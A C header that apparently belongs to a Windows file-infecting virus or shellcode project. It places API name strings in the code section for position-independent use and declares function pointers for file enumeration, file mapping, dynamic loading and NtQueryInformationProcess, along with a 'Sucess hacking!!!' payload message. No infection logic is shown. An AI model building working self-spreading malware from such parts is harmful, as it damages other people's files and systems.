#pragma once 
#include <Windows.h>

char aCreateFileA[] __attribute__((section(".text"))) = "CreateFileA";
char aCreateFileMappingA[] __attribute__((section(".text"))) = "CreateFileMappingA";
char aMapViewOfFile[] __attribute__((section(".text"))) = "MapViewOfFile";
char aCloseHandle[] __attribute__((section(".text"))) = "CloseHandle";
char aUnmapViewOfFile[] __attribute__((section(".text"))) = "UnmapViewOfFile";
char aGetProcAddress[] __attribute__((section(".text"))) = "GetProcAddress";
char aUser32dll[] __attribute__((section(".text"))) = "user32.dll";
char aGetFileSize[] __attribute__((section(".text"))) = "GetFileSize";
char aGetModuleFileNameA[] __attribute__((section(".text"))) = "GetModuleFileNameA";
char aRtlCopyMemory[] __attribute__((section(".text"))) = "RtlCopyMemory";
char aMessageBoxA[] __attribute__((section((".text")))) = "MessageBoxA";
char aFindFirstFileA[] __attribute__((section(".text"))) = "FindFirstFileA";
char aFindNextFileA[] __attribute__((section(".text"))) = "FindNextFileA";
char aFindClose[] __attribute__((section(".text"))) = "FindClose";
char aLoadLibraryA[] __attribute__((section(".text"))) = "LoadLibraryA";
char aUser32[] __attribute__((section(".text"))) = "User32.dll";
char aNtDlldll[] __attribute__((section(".text"))) = "NtDll.dll";
wchar_t aKernel32dll[] __attribute__((section(".text"))) = L"Kernel32.dll";
char aOurGoal[] __attribute__((section(".text"))) = "Sucess hacking!!!";
char aExitProcess[] __attribute__((section(".text"))) = "ExitProcess";
char aNtQueryInformationProcess[] __attribute__((section(".text"))) = "NtQueryInformationProcess";
char aGetCurrentProcess[] __attribute__((section(".text"))) = "GetCurrentProcess";

/////// Pure copy, but there is no point in coding them again as it only declare string and define func pointer (rename ???)
typedef HANDLE(WINAPI * pCreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode,
                                         LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition,
                                         DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
typedef HANDLE(WINAPI *pCreateFileMappingA)(HANDLE hFile, LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
                                                DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow,
                                                LPCSTR lpName);
typedef LPVOID(WINAPI *pMapViewOfFile)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh,
                                           DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap);
typedef BOOL(WINAPI *pUnmapViewOfFile)(LPCVOID lpBaseAddress);
typedef BOOL(WINAPI *pCloseHandle)(HANDLE hObject);

typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef DWORD(WINAPI *pGetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
typedef DWORD(WINAPI *pGetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
typedef void(WINAPI *pRtlCopyMemory)(void *Destination, VOID *Source, size_t Length);

typedef HANDLE(WINAPI *pFindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL(WINAPI *pFindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
typedef BOOL(WINAPI *pFindClose)(HANDLE hFindFile);
typedef HMODULE(WINAPI *pLoadLibraryA)(LPCSTR lpLibFileName);
typedef int(WINAPI *pMessageBoxA)(HWND hWnd, LPSTR lpText, LPSTR lpCaption, UINT uType);
typedef VOID(WINAPI *pExitProcess)(UINT uExitCode);
typedef HANDLE(WINAPI *pGetCurrentProcess)();